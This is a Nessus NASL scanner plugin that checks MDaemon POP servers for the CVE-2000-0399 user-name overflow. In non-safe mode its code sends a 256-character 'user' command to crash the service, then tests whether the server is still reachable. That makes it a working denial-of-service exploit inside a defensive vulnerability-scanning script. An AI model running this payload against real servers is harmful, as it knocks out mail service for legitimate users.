#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security, Inc.
#
#  Ref: Cassius <cassius@hushmail.com>
#
#  This script is released under the GNU GPL v2

# Changes by Tenable:
# - Revised plugin title, added OSVDB refs (6/19/09)


include("compat.inc");

if(description)
{
 script_id(14825);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2000-0399");
 script_bugtraq_id(1250);
 script_xref(name:"OSVDB", value:"1354");
 
 script_name(english:"MDaemon POP Server User Name Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by a denial-of-service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the MDaemon POP server.

It is possible to crash the remote service by sending a too long 
'user' command. 

This problem allows an attacker to make the remote MDaemon service
crash, thus preventing legitimate users from receiving e-mails." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-05/0301.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Crashes the remote pop server");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"Windows");
 script_dependencie("find_service1.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("pop3_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/pop3");
if(!port)port = 110;

if ( safe_checks() )
{
 banner = get_pop3_banner (  port: port );
 if ( ! banner ) exit(0);
 if(ereg(pattern:".* POP MDaemon ([0-2]\.|0\.3\.[0-3][^0-9])", string:banner))
 	security_warning(port);

 exit(0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  banner = recv_line(socket:soc, length:4096);
  if ( "MDaemon" >!< banner ) exit(0);
  s = string("user ", crap(256), "\r\n");
  send(socket:soc, data:s);
  d = recv_line(socket:soc, length:4096);
  s = string("pass killyou\r\n");
  send(socket:soc, data:s);
  close(soc);
  
  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
  else close(soc2);
 }
}
